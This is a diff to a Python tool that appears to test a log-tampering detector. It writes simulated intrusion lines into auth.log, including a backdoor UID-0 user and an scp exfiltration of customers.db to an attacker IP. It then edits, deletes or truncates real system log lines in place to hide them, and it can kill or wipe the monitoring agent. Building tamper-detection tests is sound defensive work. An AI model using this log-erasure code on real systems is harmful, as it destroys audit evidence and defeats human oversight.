@@ -89,26 +89,83 @@ def generate(cfg: dict, rate: float = 1.5) -> None:
         pass
 
 
-def _auth_path(cfg: dict) -> Path:
+def _source_path(cfg: dict, name: str) -> Path:
     for s in cfg["sources"]:
-        if s["name"] == "auth.log":
+        if s["name"] == name:
             return Path(s["path"])
-    return Path(cfg["sources"][0]["path"])
+    raise SystemExit(f"No watched source named {name!r}. Watched: {', '.join(s['name'] for s in cfg['sources'])}")
+
+
+def _is_real(cfg: dict, path: Path) -> bool:
+    return not cfg.get("demo_traffic", True) or not str(path).startswith(str(Path(cfg["state_dir"]).parent))
 
 
 def _rewrite(path: Path, lines: list[str]) -> None:
-    """Rewrite a file the way `sed -i` does (new file + rename)."""
-    tmp = path.with_suffix(path.suffix + ".tmp")
-    tmp.write_text("".join(ln + "\n" for ln in lines), encoding="utf-8")
-    shutil.copymode(path, tmp)
-    os.replace(tmp, path)
+    """Rewrite the file in place (same inode), as `vim` or a careful attacker would.
+
+    Keeping the inode means rsyslog keeps writing to the file after the attack.
+    """
+    data = "".join(ln + "\n" for ln in lines).encode("utf-8")
+    with open(path, "r+b") as f:
+        f.seek(0)
+        f.write(data)
+        f.truncate()
+        f.flush()
+        os.fsync(f.fileno())
 
 
-def attack(cfg: dict, action: str, line: int | None = None, text: str | None = None) -> None:
-    auth = _auth_path(cfg)
+def _read_lines(path: Path) -> list[str]:
+    try:
+        return path.read_text(encoding="utf-8", errors="replace").splitlines()
+    except PermissionError:
+        raise SystemExit(f"Permission denied on {path}. Real attackers have root - run it with sudo:  sudo ./rd attack ...")
+
+
+def _targets(lines: list[str], line: int | None, match: str | None) -> list[int]:
+    if line is not None:
+        if not 1 <= line <= len(lines):
+            raise SystemExit(f"--line must be between 1 and {len(lines)}")
+        return [line - 1]
+    if match:
+        idx = [i for i, ln in enumerate(lines) if match in ln]
+        if not idx:
+            raise SystemExit(f"No line contains {match!r}")
+        return idx
+    idx = [i for i, ln in enumerate(lines) if ATTACKER_IP in ln or BACKDOOR_USER in ln]
+    if not idx:
+        raise SystemExit("Say which lines to target: --match TEXT or --line N  (e.g. --match '/etc/shadow')")
+    return idx
+
+
+def _real_intrusion() -> None:
+    """Generate REAL security events through PAM/sudo, so the system itself writes them to auth.log."""
+    import getpass
+    import subprocess
+
+    user = getpass.getuser()
+    print(c.bold("Real intrusion: these commands run for real and the system logs them itself."))
+    print(c.dim("  1/2  three sudo attempts with a wrong password (real PAM authentication failures)"))
+    for _ in range(3):
+        subprocess.run(["sudo", "-k"], check=False)
+        subprocess.run(["sudo", "-S", "-p", "", "true"], input="definitely-wrong-password\n", text=True,
+                       capture_output=True, check=False)
+        time.sleep(0.4)
+    print(c.dim("  2/2  privileged read of the password hashes:  sudo cat /etc/shadow   (enter YOUR password)"))
+    subprocess.run(["sudo", "sh", "-c", "cat /etc/shadow > /dev/null"], check=False)
+    print(c.red(f"Done. auth.log now holds real entries: failed sudo attempts by '{user}' and 'COMMAND=/usr/bin/sh -c cat /etc/shadow'."))
+    print("Next, cover the tracks (as root):  " + c.bold("sudo ./rd attack delete --match '/etc/shadow'"))
+
+
+def attack(cfg: dict, action: str, source: str = "auth.log", line: int | None = None, match: str | None = None,
+           replace: list[str] | None = None, text: str | None = None) -> None:
+    path = _source_path(cfg, source)
+    real = _is_real(cfg, path)
     host = cfg["agent_id"]
     state = Path(cfg["state_dir"])
     if action == "intrude":
+        if real:
+            _real_intrusion()
+            return
         pid = random.randint(20000, 30000)
         for ln in [
             f"{_ts()} {host} sshd[{pid}]: Failed password for root from {ATTACKER_IP} port 51022 ssh2",
@@ -118,33 +175,32 @@ def attack(cfg: dict, action: str, line: int | None = None, text: str | None = N
             f"{_ts()} {host} useradd[{pid + 7}]: new user: name={BACKDOOR_USER}, UID=0, GID=0, home=/var/lib/{BACKDOOR_USER}, shell=/bin/bash",
             f"{_ts()} {host} sudo:     root : TTY=pts/3 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/scp /srv/app/customers.db {ATTACKER_IP}:/tmp/",
         ]:
-            _append(auth, ln)
+            _append(path, ln)
             time.sleep(0.25)
-        print(c.red(f"Attacker {ATTACKER_IP} logged in as root, read /etc/shadow, created backdoor user '{BACKDOOR_USER}'"
-                    f" and copied customers.db off the server."))
+        print(c.red(f"[simulated] Attacker {ATTACKER_IP} logged in as root, read /etc/shadow, created backdoor user "
+                    f"'{BACKDOOR_USER}' and copied customers.db off the server."))
         return
     if action in ("edit", "delete"):
-        lines = auth.read_text(encoding="utf-8").splitlines()
-        if line is not None:
-            if not 1 <= line <= len(lines):
-                raise SystemExit(f"line must be between 1 and {len(lines)}")
-            idx = [line - 1]
-        else:
-            idx = [i for i, ln in enumerate(lines) if ATTACKER_IP in ln or BACKDOOR_USER in ln]
-            if not idx:
-                raise SystemExit("No attacker lines found. Run './rd attack intrude' first, or pass --line N.")
+        lines = _read_lines(path)
+        idx = _targets(lines, line, match)
+        nums = ", ".join(str(i + 1) for i in idx)
         if action == "delete":
-            keep = [ln for i, ln in enumerate(lines) if i not in set(idx)]
-            _rewrite(auth, keep)
-            print(c.red(f"Deleted {len(idx)} line(s) from {auth.name}: {', '.join(str(i + 1) for i in idx)}"))
-        else:
-            for i in idx:
-                lines[i] = text if text is not None else (
-                    lines[i].replace(ATTACKER_IP, "198.51.100.24").replace("for root", "for deploy")
-                    .replace(f"name={BACKDOOR_USER}", "name=backup").replace("cat /etc/shadow", "systemctl status nginx")
-                    if (ATTACKER_IP in lines[i] or BACKDOOR_USER in lines[i]) else lines[i] + " (edited)")
-            _rewrite(auth, lines)
-            print(c.red(f"Rewrote {len(idx)} line(s) in {auth.name} to hide the attacker: {', '.join(str(i + 1) for i in idx)}"))
+            gone = set(idx)
+            _rewrite(path, [ln for i, ln in enumerate(lines) if i not in gone])
+            print(c.red(f"Deleted {len(idx)} line(s) from {path}: {nums}"))
+            return
+        for i in idx:
+            if text is not None:
+                lines[i] = text
+            elif replace:
+                lines[i] = lines[i].replace(replace[0], replace[1])
+            elif ATTACKER_IP in lines[i] or BACKDOOR_USER in lines[i]:
+                lines[i] = (lines[i].replace(ATTACKER_IP, "198.51.100.24").replace("for root", "for deploy")
+                            .replace(f"name={BACKDOOR_USER}", "name=backup").replace("cat /etc/shadow", "systemctl status nginx"))
+            else:
+                raise SystemExit("Say how to change the line: --replace OLD NEW  or  --text 'new line'")
+        _rewrite(path, lines)
+        print(c.red(f"Rewrote {len(idx)} line(s) in {path}: {nums}"))
         return
     if action == "kill":
         pidf = state / "agent.pid"
@@ -166,7 +222,8 @@ def attack(cfg: dict, action: str, line: int | None = None, text: str | None = N
         print(c.red(f"Wiped the agent's local database, keys and state ({state})."))
         return
     if action == "truncate":
-        _rewrite(auth, [])
-        print(c.red(f"Emptied {auth.name} completely."))
+        _read_lines(path)
+        _rewrite(path, [])
+        print(c.red(f"Emptied {path} completely."))
         return
     raise SystemExit(f"unknown attack {action}")
